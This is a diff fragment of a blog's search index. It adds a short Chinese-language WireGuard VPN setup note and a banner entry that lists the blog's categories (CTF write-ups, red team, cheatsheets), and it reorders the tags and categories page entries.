+<p><a class="link"   href="https://www.wireguard.com/install/" ><i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h3 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h3><p>推薦使用<a class="link"   href="https://www.wireguardconfig.com/" >這個<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>生config檔 (我就懶👍)</p>
+<blockquote>
+<p>不然要用 <code>wg</code> 生Server,Client 的 private&#x2F;public key 然後寫conf</p>
+</blockquote>
+<p>把 Server File 丟進 <code>/etc/wireguard/wg0.conf</code> 後 <code>wg-quick up wg0</code><br>client File 丟進 app</p>
+<p>就行了💯</p>
+<p>這個改定位沒什麼用，只能改ip所以有GPS驗證的可能沒辦法跳過</p>
+]]></content>
+      <tags>
+        <tag>vpn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Blog Banner</title>
+    <url>/2024/12/10/head/</url>
+    <content><![CDATA[<h2 id="Blog-summary"><a href="#Blog-summary" class="headerlink" title="Blog summary"></a>Blog summary</h2><ul>
+<li>CTF WriteUps</li>
+<li>Red Team</li>
+<li>courses</li>
+<li>Tools Cheatsheet</li>
+<li>Competition</li>
+<li>Research</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>cover</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>About</title>
     <url>/about/index.html</url>
     <content><![CDATA[<h1 align="center">
@@ -2801,13 +2976,13 @@ Pwnable.tw</p>
 </div>]]></content>
   </entry>
   <entry>
-    <title>categories</title>
-    <url>/categories/index.html</url>
+    <title>tags</title>
+    <url>/tags/index.html</url>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>tags</title>
-    <url>/tags/index.html</url>
+    <title>categories</title>
+    <url>/categories/index.html</url>
     <content><![CDATA[]]></content>
   </entry>
 </search>
